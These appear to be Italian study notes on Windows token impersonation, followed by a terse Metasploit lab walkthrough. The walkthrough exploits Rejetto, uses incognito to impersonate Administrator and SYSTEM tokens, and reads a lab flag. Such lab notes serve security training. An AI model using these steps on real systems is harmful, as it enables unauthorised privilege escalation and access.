```
L'impersonificazione del token di Windows è una tecnica utilizzata per eseguire un processo o un'applicazione con i privilegi di sicurezza di un altro utente o servizio. In altre parole, consente a un processo di agire come se fosse un utente diverso, senza dover effettuare l'accesso con le credenziali di quell'utente.

Ecco alcuni punti chiave riguardanti l'impersonificazione del token di Windows:

1. Token di accesso: In Windows, ogni utente o servizio ha un token di accesso associato. Questo token contiene informazioni sulle autorizzazioni e i diritti dell'utente o del servizio. L'impersonificazione coinvolge la sostituzione temporanea di un token con un altro.

2. Impersonificazione di livello di utente: Un'applicazione può impersonare un utente specifico per eseguire operazioni che richiedono autorizzazioni specifiche. Ad esempio, un'applicazione di backup potrebbe impersonare un utente con privilegi di amministratore per accedere ai file di sistema.

3. Impersonificazione di livello di servizio: I servizi di Windows possono impersonare altri servizi o account di sistema per eseguire operazioni specifiche. Ad esempio, un servizio di database potrebbe impersonare un account di servizio per accedere al database.

4. API di impersonificazione: Windows fornisce API per l'impersonificazione, come `LogonUser`, `ImpersonateLoggedOnUser` e `RevertToSelf`. Queste API consentono a un'applicazione di acquisire un token di accesso per un utente specifico e di impersonarlo.

5. Sicurezza: L'impersonificazione deve essere utilizzata con cautela e solo quando necessario. È importante garantire che l'impersonificazione sia limitata alle operazioni strettamente necessarie e che venga eseguita solo da processi attendibili.


# Metasploit - Access Token Impersonification with Incognito:
> nmap -sV -p 80 10.4.22.75
>exploit rejetto
> got meterpreter session
> getuid

Provo ad aprire dei file, ma non ho i permessi, quindi posso verificare se ci sono dei token in memoria da poter utilizzare per impersonificare altre utenze privilegiate.

Cerco il processo "explorer" per verificare con che privilegi gira
> pgrep explorer 

> load incognito
> list_tokens -u

> impersonate_token "ATTACKDEFENSE\\Administrator”
> prgerp explorer ?
> getprivs
> list_tokens -u
> impersonate_token "NT AUTHORITY\\SYSTEM”
cd C:\\Users\\Administrator\\Desktop\\ - flag
```